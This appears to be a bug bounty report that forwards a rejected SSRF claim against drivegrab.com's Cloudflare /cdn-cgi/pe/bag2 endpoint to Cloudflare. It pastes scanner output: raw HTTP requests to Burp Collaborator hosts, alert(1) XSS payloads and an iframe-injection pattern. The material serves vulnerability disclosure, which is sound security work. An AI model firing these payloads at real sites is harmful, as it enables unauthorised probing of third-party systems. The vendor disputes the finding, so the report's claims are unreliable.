title: SSRF
vulnerability_information:
Hi i  make report grabtaxi for SSRF 

But grabtaxi answer me 

coffeecup closed the report and changed the status to Not Applicable.	Jul 26th (2 hrs ago)
Hello @linkks - After further review, we have determined that this is not SSRF on any of our web properties or assets. All IP's mentioned in this report belong to Cloudflare. Additionally, please refrain from contacting us via email, please keep all communication here so that we have a record of each interaction which will aid us in our review of the report.

Please do not close as n/a 

And I want to understand if there is a threat of grabtaxi and a full investigation from you

activities.message: If you need more information, write also I want to invite you to the original report
Original report #251920
Hey @cloudflare team you see my report?

Hello,

Apologies for the delay in responding. Your report is important to us. I have escalated your report to our engineers for review and they are currently investigating. Once we have more information, or we have any questions, we'll be in touch.

Hello @matthewgall 

I'm interested in your conclusion whether this vulnerability in grabtaxi is possible if their data is leaking?

Hi  @matthewgall 

 triaged?

Hello,

As indicated in my previous response, I have escalated your report to our engineers for review and they are currently investigating. Once we have more information, or we have any questions, we'll be in touch.
Hi @matthewgall how you invite for original report grabtaxi
@matthewgall  you need more info ? Do not hesitate ask

@matthewgall i think RFI but i dont no you server or @grab

GET /cdn-cgi/pe/bag2?r[]=https://www.google.ru/images/branding/googleg/1x/googleg_standard_color_128dp.png HTTP/1.1
Host: www.drivegrab.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
PE-Token: dd05cd37a5edf79869bd11b027139a5afe194c5e-1500646565-1800
Referer: https://www.drivegrab.com/
Cookie: __cfduid=de220b258d3e4ddba3e27a9b4f8ff7ccd1500243180

@matthewgall original report Out-of-band resource load (HTTP) It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response. The payload http://lzodgulrvfff244mq1ry9dn21t7jvcj36tui.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 was submitted in the r[] parameter. The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response. Issue background Out-of-band resource load arises when it is possible to induce an application to fetch content from an arbitrary external location, and incorporate that content into the application's own response(s). The ability to trigger arbitrary out-of-band resource load does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. The ability to request and retrieve web content from other systems can allow the application server to be used as a two-way attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack, or retrieve content from, other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. Additionally, the application's processing of web content that is retrieved from arbitrary URLs exposes some important and non-conventional attack surface. An attacker can deploy a web server that returns malicious content, and then induce the application to retrieve and process that content. This processing might give rise to the types of input-based vulnerabilities that are normally found when unexpected input is submitted directly in requests to the application. The out-of-band attack surface that the application exposes should be thoroughly tested for these types of vulnerabilities. Issue remediation You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary out-of-band resource load is intended behavior. If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. You should also ensure that content retrieved from other systems is processed in a safe manner, with the usual precautions that are applicable when processing input from direct incoming web requests. If the ability to trigger arbitrary out-of-band resource load is not intended behavior, then you should implement a whitelist of permitted URLs, and block requests to URLs that do not appear on this whitelist. GET /cdn-cgi/pe/bag2?r[]=http%3a%2f%2flzodgulrvfff244mq1ry9dn21t7jvcj36tui.burpcollaborator.net%2fr%2f%3fid%3dh1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 HTTP/1.1 Host: www.drivegrab.com Cache-Control: no-cache Accept: / PE-Token: 2eca209135ea7aaa306bae0fb2b5715c9b899333-1500246572-1800 Referer: https://www.drivegrab.com/ User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Language: en-us,en;q=0.5 Cookie: __cfduid=d51d4114459e75f9fbad2f4e76f0463eb1500246570 Accept-Encoding: gzip, deflate HTTP/1.1 200 OK Date: Mon, 17 Jul 2017 13:47:04 GMT Content-Type: multipart/mixed; boundary="Hz=dT7KPW6Mr?E vU-oR" Connection: keep-alive Server: cloudflare-nginx CF-RAY: 37fda6aafad10887-FRA Content-Length: 1007 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="Hz=dT7KPW6Mr?E vU-oR" --Hz=dT7KPW6Mr?E vU-oR X-Cf-Url: http://lzodgulrvfff244mq1ry9dn21t7jvcj36tui.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 X-Cf-Status: 200 Content-Transfer-Encoding: binary X-Cf-Max-Age: 7200 X-Cf-Origin-Status: 200 X-Cf-Cache-Status: MISS Content-Type: text/html X-Cf-Error: false k99xp2gcsfzuae7tpa76z6zjiglgjfigz --Hz=dT7KPW6Mr?E vU-oR-- The Collaborator server received an HTTP request. The request was received from IP address 162.158.91.141 at 2017-июл-17 13:47:04 UTC. GET /r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 HTTP/1.1 Host: lzodgulrvfff244mq1ry9dn21t7jvcj36tui.burpcollaborator.net CF-Connecting-IP: 89.20.2.6 CF-Bag: 1 Connection: close CF-RAY: 37fda6ab10a32720 X-Real-IP: 89.20.2.6 X-Forwarded-Proto: http CF-Visitor: {"scheme":"http"} Cache-Control: no-cache Accept: / Referer: https://www.drivegrab.com/ User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Language: en-us,en;q=0.5 HTTP/1.1 200 OK Server: Burp Collaborator https://burpcollaborator.net/ X-Collaborator-Version: 3 Content-Type: text/html Content-Length: 59 k99xp2gcsfzuae7tpa76z6zjiglgjfigz XSS https://www.drivegrab.com/cdn-cgi/pe/bag2?r[]=33183%3balert(1)%2f%2f105 https://www.drivegrab.com/cdn-cgi/pe/bag2?r[]=http%3a%2f%2fr87.me%2fr%2f%3fid%3dh1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l063741%0aalert(1)%2f%2f715 External service interaction (DNS) It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. The payload http://a5g2mjrg14l48tabwqxnf2tr7id811psci07.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 was submitted in the r[] parameter. The application performed a DNS lookup of the specified domain. Issue background External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, and these are reported as separate issues. If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, then this strongly indicates that the application attempted to connect using that other service, but was prevented from doing so by egress filters in place at the network layer. The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. Issue remediation You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary external service interactions is intended behavior. If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist. GET /cdn-cgi/pe/bag2?r[]=http%3a%2f%2fa5g2mjrg14l48tabwqxnf2tr7id811psci07.burpcollaborator.net%2fr%2f%3fid%3dh1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 HTTP/1.1 Host: www.drivegrab.com Cache-Control: no-cache Accept: / PE-Token: 2eca209135ea7aaa306bae0fb2b5715c9b899333-1500246572-1800 Referer: https://www.drivegrab.com/ User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Language: en-us,en;q=0.5 Cookie: __cfduid=d51d4114459e75f9fbad2f4e76f0463eb1500246570 Accept-Encoding: gzip, deflate HTTP/1.1 200 OK Date: Mon, 17 Jul 2017 13:50:28 GMT Content-Type: multipart/mixed; boundary="mZq H-p/?zA:E0,Nz)" Connection: keep-alive Server: cloudflare-nginx CF-RAY: 37fdaba34e2c63e5-FRA Content-Length: 1001 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="mZq H-p/?zA:E0,Nz)" --mZq H-p/?zA:E0,Nz) X-Cf-Url: http://a5g2mjrg14l48tabwqxnf2tr7id811psci07.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 X-Cf-Status: 200 Content-Transfer-Encoding: binary X-Cf-Max-Age: 7200 X-Cf-Origin-Status: 200 X-Cf-Cache-Status: MISS Content-Type: text/html X-Cf-Error: false k99xp2gcsfzuae7tpa76z6zjiglgjfigz --mZq H-p/?zA:E0,Nz)-- The Collaborator server received a DNS lookup of type A for the domain name a5g2mjrg14l48tabwqxnf2tr7id811psci07.burpcollaborator.net. The lookup was received from IP address 162.158.86.178 at 2017-июл-17 13:50:28 UTC. External service interaction (HTTP) It is possible to induce the application to perform server-side HTTP requests to arbitrary domains. The payload http://4jow0d5afyzymno5akbhtw7llcr2fv3mqce1.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 was submitted in the r[] parameter. The application performed an HTTP request to the specified domain. Issue background External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Language: en-us,en;q=0.5 Cookie: __cfduid=d51d4114459e75f9fbad2f4e76f0463eb1500246570 Accept-Encoding: gzip, deflate HTTP/1.1 200 OK Date: Mon, 17 Jul 2017 13:50:29 GMT Content-Type: multipart/mixed; boundary="ah3no eSNuS5thQD='P0" Connection: keep-alive Server: cloudflare-nginx CF-RAY: 37fdaba91a802690-FRA Content-Length: 1007 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="ah3no eSNuS5thQD='P0" --ah3no eSNuS5thQD='P0 X-Cf-Url: http://4jow0d5afyzymno5akbhtw7llcr2fv3mqce1.burpcollaborator.net/r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 X-Cf-Status: 200 Content-Transfer-Encoding: binary X-Cf-Max-Age: 7200 X-Cf-Origin-Status: 200 X-Cf-Cache-Status: MISS Content-Type: text/html X-Cf-Error: false k99xp2gcsfzuae7tpa76z6zjiglgjfigz --ah3no eSNuS5thQD='P0-- GET /r/?id=h1-kuvncnebdqbp0irsegw9o8fbbd_inryz7j6my8l0 HTTP/1.1 Host: 4jow0d5afyzymno5akbhtw7llcr2fv3mqce1.burpcollaborator.net CF-Connecting-IP: 89.20.2.6 CF-Bag: 1 Connection: close CF-RAY: 37fdaba920f66421 X-Real-IP: 89.20.2.6 X-Forwarded-Proto: http CF-Visitor: {"scheme":"http"} Cache-Control: no-cache Accept: / Referer: https://www.drivegrab.com/ User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Language: en-us,en;q=0.5 HTTP/1.1 200 OK Server: Burp Collaborator https://burpcollaborator.net/ X-Collaborator-Version: 3 Content-Type: text/html Content-Length: 59 k99xp2gcsfzuae7tpa76z6zjiglgjfigz Frame Injection URL https://www.drivegrab.com/cdn-cgi/pe/bag2?r[]= Notes Due to the Content-type header of the response, exploitation of this vulnerability might not be possible in all browsers or might not be possible at all. The Content-type header indicates that there is a possibility of exploitation by changing the attack. However Netsparker does not support confirming these issues. You need to manually confirm this problem. Generally lack of filtering in the response can cause Cross-site Scripting vulnerabilities in browsers with auto mime sniffing such as Internet Explorer. Parameter Name r[] Parameter Type GET Attack Pattern %3ciframe+src%3d%22http%3a%2f%2ftest.com%2f%3f%22%3e%3c%2fiframe%3e Vulnerability Details I am detected frame injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input. Impact An attacker might use this vulnerability to redirect users to other malicious websites that are used for phishing and similar attacks. Remedy •Where possible do not use users' input for URLs. •If you definitely need dynamic URLs, make a list of valid accepted URLs and do not accept other URLs. •Ensure that you only accept URLs which are located on accepted domains.
